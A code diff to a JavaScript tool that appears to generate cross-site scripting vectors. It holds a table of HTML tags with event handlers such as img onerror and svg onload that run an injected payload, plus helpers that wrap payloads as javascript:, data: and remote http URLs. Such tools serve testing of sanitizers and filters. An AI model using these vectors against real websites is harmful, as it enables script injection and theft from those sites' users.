@@ -21,10 +21,8 @@ var caps = {
     {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
     {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
     {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
-    {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}},
-    {"tagName": "input", "attributes": {"autofocus": "", "onblur": ['X-payload', 'text/javascript']}},
-    {"tagName": "video", "attributes": {"poster": ['X-url', 'text/javascript'] }},
-    {"tagName": "svg", "attributes": {"onload": ['X-url', 'text/javascript']}},
+    {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO make autofocus thing work
+    {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
     {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
     {"tagName": "A", "attributes": {"folder": ['X-url', 'text/javascript'],"style": "behavior:url(#default#AnchorClick);"}, "content": ['X-payload','text']},
     {"tagName": "object", "attributes": {"data":['X-url', 'text/javascript']}},
@@ -133,10 +131,15 @@ function makeURL(contenttype) {
      * type = content-type string like "text/html",
      * resolve = a method that allows the content of the url to be fetched (data urls require the content to be there, not pointed at :)),
      */
-    'javascript': function(path, type) { return 'javascript:' + makePayload(path); },
+    'javascript': function(path, type) {
+      // falling back to HTTP if type is not text/js
+      if (type !== 'text/javascript') { return URL_LAYERS['http'](path, type); }
+      return 'javascript:' + makePayload(path);
+    },
     'data:': function(path, type) { return 'data:' +type+ ',' + makePayload(path);  },
     'data-base64': function(path, type) { return 'data:' +type+ ';base64,' + btoa(makePayload(path));  },
-    'http': function(path, type) { return 'http://' + CONFIG_HOST + '/' + CONFIG_PATH + '/' + path;  }
+    'http': function(path, type) { return 'http://' + CONFIG_HOST + '/' + CONFIG_PATH + '/' + path;  },
+    ///TODO add https
   }
   URL_LAYERS['feed'] =  function(path, type) { return 'feed:' + URL_LAYERS['http'](path); };
   URL_LAYERS['pcast'] = function(path, type) { return 'pcast:' + URL_LAYERS['http'](path); },
@@ -153,7 +156,7 @@ function makePayload(path) {
     var fs = require("fs");
     return fs.readFileSync(path);
   } else {
-    var xhr = XMLHttpRequest();
+    var xhr = new XMLHttpRequest();
     var result;
     xhr.open("GET", path, false);
     xhr.onload = function() { result = xhr.response };
